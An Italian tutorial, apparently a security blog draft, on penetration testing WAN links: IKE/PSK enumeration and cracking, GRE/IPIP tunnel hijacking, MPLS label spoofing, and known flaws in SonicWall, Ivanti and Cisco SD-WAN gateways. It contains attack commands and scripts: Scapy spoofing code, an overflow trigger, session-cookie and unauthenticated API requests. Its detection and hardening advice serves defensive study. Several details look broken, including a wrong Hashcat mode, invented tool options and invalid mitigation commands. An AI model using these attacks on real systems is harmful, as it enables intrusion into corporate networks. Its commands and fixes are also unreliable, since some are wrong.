---
title: 'WAN Penetration Testing: VPN, IPsec, MPLS e SD-WAN'
slug: wan
description: 'Guida al WAN penetration testing: analizza VPN, IPsec, MPLS e SD-WAN, individua vulnerabilità nei tunnel e verifica la sicurezza dell''infrastruttura WAN.'
image: /wan-pentesting-vpn-ipsec-mpls-sd-wan-tunnel-hijacking.webp
draft: true
date: 2026-09-20T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - vpn-pentesting
  - ipsec
  - sd-wan
  - tunnel-hijacking
  - mpls
---

# WAN Pentesting: cos’è, come funziona e come testare VPN, IPsec e SD-WAN

Il WAN penetration testing è l'insieme delle tecniche usate per valutare la sicurezza dei collegamenti tra sedi di un'organizzazione: VPN gateway, tunnel IPsec, apparati SD-WAN e infrastrutture MPLS. L'obiettivo è verificare se questi collegamenti possono essere abusati per ottenere accesso non autorizzato alla rete interna, intercettare traffico o muoversi lateralmente tra sedi.

Cosa si testa concretamente durante un WAN penetration test:

* VPN site-to-site e remote access (IPsec, SSL/TLS)
* Negoziazione IKE e robustezza delle pre-shared key
* Protocolli di tunneling (GRE, IPIP, 6in4, 4in6)
* Apparati SD-WAN e loro control plane
* Infrastrutture MPLS
* Vulnerabilità note degli apparati vendor-specifici (SonicWall, Ivanti, Cisco)

Negli ultimi anni sono emerse vulnerabilità concrete su larga scala in questo ambito: **4,26 milioni di host** risultano esposti a tunnel hijacking su GRE/IPIP/4in6/6in4 (ricerca KU Leuven/Top10VPN, CVE-2024-7595, CVE-2024-7596, CVE-2025-23018, CVE-2025-23019); **SonicWall SSL-VPN** (CVE-2024-53704) ha permesso di rubare la sessione di un utente già connesso senza autenticarsi, sfruttato dal gruppo ransomware Akira; **Ivanti Connect Secure** (CVE-2025-22457) ha permesso di eseguire comandi da remoto senza autenticarsi, sfruttato dal gruppo APT UNC5221.

Un **CVE** è semplicemente un codice identificativo standard assegnato a una vulnerabilità nota pubblicamente (es. CVE-2024-53704): serve a riferirsi allo stesso problema in modo univoco. Il **catalogo CISA KEV** è l'elenco ufficiale (mantenuto dall'ente USA per la cybersecurity) delle vulnerabilità che sono state osservate sfruttate attivamente in attacchi reali, non solo teoriche. Un **gruppo APT** (Advanced Persistent Threat) è un gruppo di attaccanti strutturato e con risorse consistenti, spesso legato a uno stato o a un'organizzazione criminale organizzata — diverso da un attaccante isolato.

## Prima di continuare: i concetti base

Se questi termini non ti sono familiari, partiamo da qui prima di entrare nel tecnico.

**VPN**: una connessione cifrata che collega due punti attraverso una rete non fidata (tipicamente Internet), facendoli comunicare come se fossero sulla stessa rete locale.

**Tunnel**: il "canale" logico attraverso cui viaggiano i dati della VPN. Un pacchetto di dati viene incapsulato — cioè racchiuso — dentro un altro pacchetto, per poter attraversare la rete pubblica e arrivare intatto dall'altra parte.

**IPsec**: una suite di protocolli che cifra e autentica il traffico IP. È lo standard più diffuso per collegare in VPN due sedi aziendali (VPN site-to-site).

**IKE (Internet Key Exchange)**: il protocollo che due dispositivi IPsec usano per accordarsi su come cifrare il traffico, prima di aprire il tunnel vero e proprio. È come due persone che si mettono d'accordo su quale codice segreto usare, prima di iniziare a scambiarsi messaggi cifrati con quel codice.

**PSK (Pre-Shared Key)**: una password condivisa in anticipo tra i due lati della VPN, usata durante la negoziazione IKE per autenticarsi a vicenda. Se un attaccante indovina o recupera questa password, può fingersi uno dei due lati del tunnel.

**NAT-T (NAT Traversal)**: una tecnica che permette al traffico IPsec di attraversare correttamente un dispositivo NAT (es. un router domestico che traduce indirizzi IP), cosa che il protocollo IPsec "puro" non gestirebbe bene da solo.

**MPLS**: una tecnica di instradamento usata dai grandi operatori di rete. Invece di decidere il percorso di un pacchetto guardando l'indirizzo IP di destinazione a ogni passaggio (come fa il routing IP classico), i router si scambiano delle "etichette" numeriche e instradano i pacchetti seguendo quelle. È più veloce, ma pensato per funzionare dentro reti fidate, non per resistere ad attacchi.

**SD-WAN**: un livello di gestione software che centralizza la configurazione di tutti questi collegamenti (VPN, MPLS, connessioni Internet) da un unico pannello, invece di configurare ogni router manualmente uno per uno.

**Control plane / data plane**: il control plane è la parte del sistema che decide "dove deve andare il traffico" (le regole, le decisioni di instradamento); il data plane è la parte che sposta effettivamente i pacchetti seguendo quelle regole. Se un attaccante compromette il control plane, può cambiare le regole per tutta la rete anche senza toccare il traffico direttamente.

## Componenti WAN da testare

**VPN site-to-site (IPsec)**
Collegamento permanente tra due sedi o tra sede e cloud. Usa porta 500/UDP (IKE) e 4500/UDP (incapsulamento NAT-T). La negoziazione avviene tramite IKE, con una pre-shared key (PSK) o certificati. Vettori tipici: PSK debole, sniffing della negoziazione IKE, downgrade crittografico.

**VPN remote access (SSL/TLS)**
Prodotti come Cisco AnyConnect, SonicWall SSL-VPN, Fortinet FortiClient, Ivanti Connect Secure. Espone porta 443 o 8443, autenticazione con credenziali ed eventuale MFA. Vettori tipici: bypass di autenticazione, credential stuffing, session hijacking, credenziali di default.

**MPLS (Multiprotocol Label Switching)**
Instradamento carrier-grade basato su label anziché lookup dell'IP di destinazione. Non prevede cifratura nativa (si appoggia a un layer IPsec sottostante quando serve). Vettore tipico: label spoofing e injection su router che non verificano la provenienza del pacchetto.

**SD-WAN**
Orchestrazione centralizzata del traffico WAN (Cisco Catalyst SD-WAN, Versa, Fortinet). Vettori tipici: compromissione del control plane, bypass delle policy, manipolazione dei tunnel.

**Gateway e firewall di confine**
Apparati come FortiGate, Palo Alto, Check Point, Cisco ASA che delimitano il confine tra Internet e rete interna. Vettori tipici: bypass o manipolazione delle regole.

## Enumeration di VPN e WAN Gateway

### Scansione delle porte tipiche

Usa [Nmap](https://hackita.it/articoli/nmap/) per individuare i gateway esposti:

```bash
# IPsec (IKE)
nmap -sU -p 500 192.168.0.0/24

# IPsec NAT-T
nmap -sU -p 4500 192.168.0.0/24

# SSL-VPN (AnyConnect, SonicWall)
nmap -sV -p 443,8443 192.168.0.0/24

# OpenVPN
nmap -sU -p 1194 192.168.0.0/24

# WireGuard
nmap -sU -p 51820 192.168.0.0/24
```

### Enumerazione dell'handshake IKE

`ike-scan` forza una negoziazione IKE per scoprire i transform supportati (cifratura, hash) e l'identità del server:

```bash
apt-get install ike-scan

# Aggressive mode: rivela i transform supportati
ike-scan -A 192.168.1.1

# Rilevazione IKEv2
ike-scan --ikev2 192.168.1.1
```

Un codice di risposta `601` (SA not accepted) significa che il server rifiuta i parametri proposti: è normale enumerazione, non un tentativo di brute force.

Nota sui due modi in cui può avvenire questa negoziazione: in **Main Mode** (più protetto) l'identità dei due lati resta nascosta fino a quando il canale non è già cifrato; in **Aggressive Mode** (più veloce ma meno sicuro) alcune informazioni, incluso un hash derivato dalla PSK, vengono scambiate prima che il canale sia protetto — ed è proprio questo hash che un attaccante può catturare e provare a crackare offline, come vedremo più avanti.

### Fingerprinting del vendor

```bash
# Analisi del certificato SSL
echo | openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -text | grep -i "subject\|issuer\|CN="

# Header HTTP di risposta
curl -k https://192.168.1.1 -I -H "User-Agent: Mozilla"

# SNMP, se esposto
snmpwalk -v2c -c public 192.168.1.1 sysDescr.0
```

Il certificato e gli header di risposta spesso rivelano il vendor esatto (Cisco ASA, SonicWall, Palo Alto, FortiGate), utile per orientare la ricerca di CVE note su quel prodotto e quella versione.

### Lab di test: IPsec site-to-site in GNS3

Per testare PSK cracking e tunnel hijacking senza toccare un ambiente di produzione, un lab in GNS3 con due router Cisco è sufficiente:

```
[HQ-Router] -- [Internet Cloud, zona di attacco] -- [Branch-Router]
```

Configurazione IKEv2 di base sul router HQ:

```
crypto ikev2 proposal PROPOSAL-1
  encryption aes-cbc-256
  integrity sha256
  group 14
!
crypto ikev2 policy POLICY-1
  proposal PROPOSAL-1
!
crypto ikev2 keyring KEYRING-1
  peer 203.0.113.200
    address 203.0.113.200
    pre-shared-key 12345678
!
crypto ikev2 profile PROFILE-1
  match identity address 203.0.113.200
  authentication remote pre-share
  authentication local pre-share
  keyring local KEYRING-1
!
crypto ipsec transform-set TRANSFORM-SET esp-aes 256 esp-sha-hmac
!
crypto ipsec profile IPSEC-PROFILE
  set transform-set TRANSFORM-SET
!
interface Tunnel0
  ip address 10.0.0.1 255.255.255.0
  tunnel source 203.0.113.1
  tunnel destination 203.0.113.200
  tunnel mode ipsec ipv4
  tunnel protection ipsec profile IPSEC-PROFILE
```

Verifica dello stato del tunnel: `show crypto session brief` (atteso `Status = UP`). Dalla macchina attaccante nella zona Internet Cloud:

```bash
tcpdump -i eth0 'udp port 500 or esp' -w tunnel.pcap
ike-scan 203.0.113.200 -A
```

## IPsec e IKE: cracking della PSK

### Cattura dell'handshake

```bash
tcpdump -i eth0 'udp port 500 or udp port 4500' -w ike_handshake.pcap
```

In Wireshark, filtra su `isakmp` e cerca lo scambio IKE Phase 1 in Aggressive Mode: è lì che viene inviato in chiaro l'hash derivato dalla PSK (`SKEYID_a`). Per una guida completa allo strumento vedi [Wireshark](https://hackita.it/articoli/wireshark/). In Main Mode l'hash arriva solo nell'ultimo messaggio, già cifrato: per estrarlo serve analisi offline del pcap.

### Estrazione e cracking dell'hash

```bash
# ikecrack estrae l'hash dal pcap
git clone https://github.com/ikecrack/ikecrack.git
cd ikecrack
./ikecrack -p ike_handshake.pcap -o psk_hashes.txt
# Output: $ike$<spi>$<hash_md5>

# Cracking offline con Hashcat
hashcat -m 5500 psk_hashes.txt /usr/share/wordlists/rockyou.txt
```

Guida completa allo strumento: [Hashcat](https://hackita.it/articoli/hashcat/).

### Brute force online in Aggressive Mode

```bash
ike-scan -A 192.168.1.1 --pskcrack --wordlist=/path/to/psk_common.txt
```

Oppure con Metasploit:

```
use auxiliary/scanner/ipsec/ike_scan
set RHOSTS 192.168.1.1
set WORDLIST /path/to/wordlist.txt
exploit
```

### Verifica della password trovata

```bash
ike-scan -A -P 192.168.1.1 --pskcrack-key="password_trovata"
```

Se la connessione si stabilisce senza timeout, la PSK è corretta.

## Tunnel Hijacking: CVE-2024-7595/7596 e correlate

Nel 2025, la ricerca KU Leuven/Top10VPN ha documentato una famiglia di vulnerabilità che riguarda protocolli di tunneling privi di verifica del mittente:

* **CVE-2024-7595**: GRE e GRE6 (RFC 2784), nessuna verifica del mittente
* **CVE-2024-7596**: Generic UDP Encapsulation (GUE), nessuna verifica del mittente
* **CVE-2025-23018**: IPv4-in-IPv6 e IPv6-in-IPv6 (RFC 2473), nessuna verifica del mittente
* **CVE-2025-23019**: IPv6-in-IPv4 (6in4), nessuna verifica del mittente

**GRE** e **IPIP** sono protocolli di incapsulamento: prendono un pacchetto IP e lo "impacchettano" dentro un altro pacchetto IP, un po' come mettere una lettera dentro una busta più grande per spedirla. Chi riceve la busta più grande (l'host del tunnel) la apre, guarda cosa c'è dentro (il pacchetto originale) e lo inoltra alla destinazione finale scritta sulla lettera interna.

Il problema di fondo: alcuni di questi host aprono la "busta" e inoltrano il contenuto senza controllare se la busta stessa arrivava davvero da chi doveva mandarla. Un attaccante può quindi costruire una busta con dentro un pacchetto che ha come mittente un IP a piacere (**IP spoofing**, cioè falsificare l'indirizzo mittente): l'host la apre comunque e inoltra il pacchetto interno come se provenisse da quel mittente falso. È un meccanismo che permette di nascondere l'origine reale del traffico, non un modo per accedere direttamente alla rete interna del target.

Lo stesso principio di fondo — un servizio che si fida ciecamente di una destinazione indicata dal client, senza verificarla — è alla base anche di una tecnica molto più datata su un protocollo diverso: [FTP bounce](https://hackita.it/articoli/ftp-bounce/).

La ricerca ha stimato circa 4,26 milioni di host esposti (VPN, router ISP, router core, gateway di rete mobile, alcuni nodi CDN), concentrati soprattutto su reti di alcuni grandi ISP.

### Verifica pratica con Scapy

```python
from scapy.all import IP, ICMP, send, conf

def tunnel_hijack(tunnel_endpoint, victim_ip, target_ip, num_packets=10):
    """
    Invia pacchetti IPIP con IP interno spoofato verso un host che
    incapsula/decapsula senza verificare il mittente (CVE-2024-7595/7596).
    Da usare esclusivamente su lab o target per cui si dispone di autorizzazione esplicita.
    """
    conf.iface = "eth0"
    for i in range(num_packets):
        inner_pkt = IP(src=victim_ip, dst=target_ip) / ICMP(type=8, code=0)
        outer_pkt = IP(src=victim_ip, dst=tunnel_endpoint, proto=4) / inner_pkt  # proto=4: IPIP
        send(outer_pkt, verbose=False)

if __name__ == '__main__':
    import sys
    tunnel_hijack(sys.argv[1], sys.argv[2], sys.argv[3],
                  int(sys.argv[4]) if len(sys.argv) > 4 else 10)
```

```bash
python3 ipip_hijack.py 203.0.113.1 203.0.113.50 8.8.8.8 10

# Verifica: la risposta ICMP dovrebbe arrivare da 203.0.113.50,
# ma inviata di fatto dal router del tunnel
tcpdump -i eth0 'src 8.8.8.8 and dst 203.0.113.50'
```

### Mitigazione

```
! Cisco ASA
access-list DENY_TUNNELS deny ipip any any
access-list DENY_TUNNELS deny gre any any
access-list DENY_TUNNELS deny 6in4 any any
access-list DENY_TUNNELS deny 4in6 any any
```

L'ingress filtering secondo RFC 2827 (blocco di pacchetti con IP sorgente non plausibile su una data interfaccia) mitiga la classe di problema alla radice.

## Vulnerabilità note su gateway VPN e SD-WAN

### SonicWall SSL-VPN — CVE-2024-53704

Interessa le serie TZ, NSa, NSsp, NSv su SonicOS 7.1.x (build precedenti a 7.1.3-7015/7.1.2-7020) e 8.0.0 precedente a 8.0.0-8037. Non riguarda SMA100/SMA1000. Aggiunta al catalogo CISA KEV a febbraio 2025, sfruttata dal gruppo ransomware Akira.

Si tratta di un caso di **session hijacking**: impossessarsi della sessione già autenticata di un altro utente (il "cookie" che il sito usa per riconoscerlo come loggato), senza conoscerne username e password. In questo caso la funzione che valida il cookie di sessione (`getSslvpnSessionFromCookie`) non verifica correttamente un cookie base64 costruito ad hoc, permettendo di ottenere una sessione SSL-VPN valida senza autenticarsi:

```python
import requests, urllib3
urllib3.disable_warnings()

target = "https://192.168.1.1"
session_cookie = "TOKEN_DI_SESSIONE_OTTENUTO"  # da test autorizzato

headers = {"Cookie": f"swap={session_cookie}"}
r = requests.get(f"{target}/cgi-bin/sslvpnclient?launchplatform=1",
                 headers=headers, verify=False, allow_redirects=False)

if r.status_code == 302 or "sessid=" in r.headers.get("Set-Cookie", ""):
    print("[+] Sessione ottenuta:", r.headers.get("Set-Cookie"))
```

Un accesso riuscito espone i bookmark del Virtual Office, la configurazione NetExtender e, potenzialmente, un tunnel VPN verso la rete interna. Indicatore di log lato SonicWall: `"SSL VPN Session - User [NAME]: Reuse SSLVPN session for no."`.

**Fix**: aggiornare a SonicOS 7.1.3-7015, 7.1.2-7020 o 8.0.0-8037 e successive. Se non è possibile aggiornare subito, disabilitare temporaneamente SSL-VPN sulle interfacce esposte a Internet.

### Ivanti Connect Secure — CVE-2025-22457

Interessa versioni di Ivanti Connect Secure fino a 22.7R2.5, Policy Secure e ZTA Gateways. La causa è un **buffer overflow**: un errore di programmazione in cui il programma scrive più dati di quanti ne abbia previsti in un'area di memoria di dimensione fissa, sovrascrivendo dati adiacenti — e in certi casi questo permette di dirottare l'esecuzione del programma verso codice scelto dall'attaccante. In questo caso il trigger è un header HTTP `X-Forwarded-For` costruito ad arte, troppo lungo rispetto a quanto il server si aspetta, che porta a **RCE (Remote Code Execution)**: la possibilità di eseguire comandi arbitrari sul server da remoto, senza autenticarsi. Aggiunta al catalogo CISA KEV ad aprile 2025; sfruttata attivamente dal gruppo APT UNC5221 con distribuzione dei malware TRAILBLAZE (in-memory), BRUSHFIRE (backdoor) e SPAWNSLOTH (manomissione dei log).

Verifica indicativa della vulnerabilità (può causare instabilità sul servizio target, da eseguire solo in ambiente autorizzato):

```bash
curl -k https://192.168.1.1/dana-na/setup/psaldownload.cgi \
  -H "X-Forwarded-For: $(python3 -c 'print("A"*2048)')"
```

Un crash del processo web è un'indicazione di vulnerabilità, da confermare con lo strumento ufficiale Ivanti Integrity Checker Tool (ICT) piuttosto che affidarsi solo a questo test.

**Fix**: aggiornare a Connect Secure 22.7R2.6 o successiva. In caso di compromissione sospetta: factory reset, reimaging pulito e revoca di tutti i certificati e le credenziali coinvolte.

### Cisco Catalyst SD-WAN — CVE-2026-20127

Un **auth bypass** (bypass di autenticazione) su Cisco SD-WAN vEdge 20.13.0 consente di accedere alle API amministrative senza fornire credenziali valide — in pratica, una porta che dovrebbe chiedere una password ma in certe condizioni non lo fa:

```bash
curl -k https://192.168.1.1:8443/api/system/settings -X GET
# Una risposta JSON invece di un 401 conferma il bypass
```

Un accesso riuscito permette di modificare policy di instradamento, creare utenti amministrativi o disabilitare la cifratura del tunnel — con conseguente possibilità di dirottare il traffico verso un host controllato dall'attaccante:

```bash
curl -k https://192.168.1.1:8443/api/config/devices/vdaemon/vpn/interface \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"vpnName": "vpn-100-test", "destination": "192.168.1.50", "gateway": "192.168.1.1", "enable": true}'
```

**Fix**: aggiornare alla versione corretta secondo l'advisory Cisco per il prodotto specifico.

## Testing di resilienza del tunnel IPsec

Oltre al cracking della PSK, in un assessment autorizzato vale la pena verificare come il tunnel reagisce a traffico anomalo:

```bash
# Volume di traffico dentro il tunnel: il gateway deve reggere senza drop anomali
hping3 --syn -p 80 -i u10000 10.0.0.2 --bind <ip-locale-del-tunnel>

# Replay attack: si cattura un pacchetto cifrato già transitato e lo si
# reinvia identico, per vedere se il gateway lo accetta una seconda volta.
# Un tunnel configurato bene deve scartarlo (protezione "anti-replay")
tcpdump -i esp0 -w tunnel_attack.pcap

# Frammentazione: pacchetti più grandi della MTU del tunnel devono
# essere gestiti correttamente
ping -s 1400 10.0.0.2
```

## MPLS: label spoofing

Come spiegato prima, MPLS instrada i pacchetti seguendo etichette numeriche invece dell'indirizzo IP. Il dispositivo che fa questo instradamento si chiama **LSR (Label Switching Router)**, e il suo compito a ogni salto è semplice: guarda l'etichetta in arrivo, la sostituisce con una nuova (questo si chiama **label swap**) e inoltra il pacchetto sull'interfaccia corrispondente — senza necessariamente controllare se quell'etichetta doveva davvero arrivare da lì. Se un attaccante con accesso alla rete MPLS invia un pacchetto con un'etichetta che non gli appartiene, un LSR privo di controlli lo inoltra comunque come se fosse traffico legittimo, con conseguente possibilità di redirezione o intercettazione dei dati.

```python
from scapy.all import Ether, MPLS, IP, ICMP, sendp

mpls_hdr = MPLS(label=900, cos=0, s=1, ttl=64)
payload = IP(src="10.0.0.5", dst="10.0.0.10") / ICMP()
pkt = Ether() / mpls_hdr / payload

sendp(pkt, iface="eth0")
```

Da notare: questo tipo di attacco richiede tipicamente **accesso on-path** alla rete MPLS — cioè l'attaccante deve trovarsi già in un punto della rete da cui può inviare traffico verso quei router (accesso fisico, o un router già compromesso). Non è quindi un attacco lanciabile a distanza da Internet come nel caso delle vulnerabilità sui gateway VPN viste sopra.

**Mitigazione**: abilitare la verifica dell'etichetta in ingresso sull'interfaccia attesa.

```
! Cisco IOS-XE
mpls ldp igp sync mpls ldp sync spoof-check

! Juniper Junos
set protocols mpls label-switched-path <lsp> spoof-check
```

## Come rilevare questi attacchi

* Negoziazioni IKE con transform inusuali o ripetuti tentativi di rinegoziazione verso lo stesso peer
* Pacchetti di tunneling (GRE/IPIP) in ingresso da un mittente diverso dal peer atteso del tunnel
* Log VPN con riuso anomalo di token di sessione
* Crash ripetuti del processo VPN/gateway (possibile indicatore di tentativi di exploitation)
* Pacchetti MPLS con etichette non coerenti con l'interfaccia di ricezione
* Alert su chiamate API amministrative non autenticate verso apparati SD-WAN

## Strumenti

**Enumerazione ed exploitation VPN**: `ike-scan`, `ikecrack`, moduli Metasploit (`auxiliary/scanner/ipsec/ike_scan` e altri specifici per CVE note), [Burp Suite](https://hackita.it/articoli/burp-suite/) per la parte web delle SSL-VPN, [Shodan](https://hackita.it/articoli/shodan/) per la discovery di gateway esposti.

**Crafting e analisi pacchetti**: [Scapy](https://hackita.it/articoli/scapy/) per costruire pacchetti IPIP/GRE/MPLS/IKE custom, [Wireshark](https://hackita.it/articoli/wireshark/) per l'analisi dei protocolli, [tcpdump](https://hackita.it/articoli/tcpdump/) per la cattura, [Hashcat](https://hackita.it/articoli/hashcat/) per il cracking accelerato via GPU.

**Simulazione di rete**: GNS3 per simulare router e ASA Cisco, StrongSwan come implementazione IPsec di riferimento per i test.

## Casi reali documentati

**Ransomware via compromissione VPN (gruppo Akira, 2025)**: accesso iniziale tramite CVE-2024-53704 su SonicWall, movimento laterale nella LAN una volta dentro (per approfondire questa fase vedi [pivoting](https://hackita.it/articoli/pivoting/)), cifratura dei server critici. Decine di aziende colpite, danni complessivi stimati oltre 200 milioni di dollari — a conferma che il gateway VPN resta uno dei punti di ingresso più critici in un'infrastruttura aziendale.

**Abuso di tunnel vulnerabili su scala Internet (2025)**: sfruttando gli host esposti a CVE-2024-7595/7596 e correlate, è stato possibile far transitare traffico con IP sorgente spoofato attraverso infrastrutture di ISP e CDN, complicando l'attribuzione del traffico malevolo.

## Checklist operativa

* Scansiona le porte VPN tipiche (500, 4500, 443, 8443)
* Enumera i transform IKE supportati
* Verifica se il server accetta Aggressive Mode (hash PSK in chiaro)
* Se possibile, cattura e prova a crackare la PSK offline
* Verifica la presenza delle CVE note sui gateway VPN/SD-WAN identificati (SonicWall, Ivanti, Cisco e altri, in base al fingerprinting)
* Testa la resilienza del tunnel a traffico anomalo e replay
* Verifica lo spoof-check sui router MPLS, se presenti
* Documenta credenziali di default non modificate

## FAQ

**Cos'è il WAN penetration testing?**
È la valutazione della sicurezza dei collegamenti tra sedi di un'organizzazione: VPN, tunnel IPsec, SD-WAN e infrastrutture MPLS.

**Come si testa una VPN IPsec?**
Enumerando le porte e i transform IKE supportati, verificando se il server accetta Aggressive Mode (che espone l'hash della PSK) e, se autorizzato, tentando il cracking offline della PSK catturata.

**Quali porte usa IPsec?**
Porta 500/UDP per IKE e 4500/UDP per l'incapsulamento NAT-T.

**Cos'è il tunnel hijacking?**
Lo sfruttamento di protocolli di tunneling (GRE, IPIP, 6in4, 4in6) che non verificano il mittente dei pacchetti incapsulati, permettendo di far transitare traffico con IP sorgente spoofato attraverso l'host vulnerabile.

**MPLS è sicuro di default?**
Non offre cifratura nativa e, senza spoof-check attivo sui router, è esposto a label spoofing. Richiede però tipicamente un accesso on-path alla rete, non è sfruttabile direttamente da Internet.

**Qual è la differenza tra IPsec, GRE e IPIP?**
IPsec cifra e autentica il traffico. GRE e IPIP sono protocolli di incapsulamento senza cifratura nativa: trasportano pacchetti di un protocollo dentro un altro, e sono proprio i protocolli coinvolti nelle vulnerabilità di tunnel hijacking descritte sopra.

**Una VPN andrebbe esposta a Internet?**
Per l'accesso remoto è spesso necessario, ma va accompagnata da restrizioni IP dove possibile, MFA obbligatoria, limitazione dei tentativi di autenticazione e patching tempestivo delle CVE note.

## Raccomandazioni di hardening

* IPsec site-to-site: IKEv2, AES-GCM, DH Group 14 o superiore, PSK lunga e casuale (20+ caratteri)
* VPN remote access: TLS 1.3, MFA obbligatoria, preferibilmente con token hardware
* SD-WAN: TLS sul control plane, verifica delle policy, monitoraggio delle modifiche
* MPLS: spoof-check attivo su tutti gli LSR, filtro dei protocolli di tunneling non autorizzati
* Gateway VPN: patching delle CVE critiche in tempi brevi, disabilitazione degli account di default
* Monitoraggio: alert su negoziazioni IKE anomale e pattern di disconnessione VPN sospetti

## Risorse esterne

* [Top10VPN – Tunneling Protocol Vulnerability Research](https://www.top10vpn.com/research/tunneling-protocol-vulnerability/): dettagli sulla ricerca KU Leuven e sui CVE di tunnel hijacking
* [CISA – Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog): elenco ufficiale delle vulnerabilità sfruttate attivamente, incluse quelle citate in questo articolo
* [RFC 4379 – MPLS LSP Ping/Traceroute](https://tools.ietf.org/html/rfc4379): riferimento per la diagnostica e la verifica delle etichette MPLS
* [RFC 7539 – ChaCha20-Poly1305](https://tools.ietf.org/html/rfc7539): cifrario moderno usato in diverse implementazioni VPN
* [Scapy – Documentazione ufficiale](https://scapy.readthedocs.io/): riferimento per il crafting dei pacchetti usato negli esempi
* [Hackzine – Attacking IPsec IKE with insecure PSK](https://www.hackzine.org/blog/attacking-ipsec-ike-insecure-psk/): walkthrough pratico sul cracking della PSK in Aggressive Mode
* [Route Zero – IKE Cheat Sheet for Penetration Testers](https://routezero.security/2025/04/06/ike-cheat-sheet-for-pentration-testers/): riferimento rapido ai comandi per fingerprinting e attacco a endpoint IKE
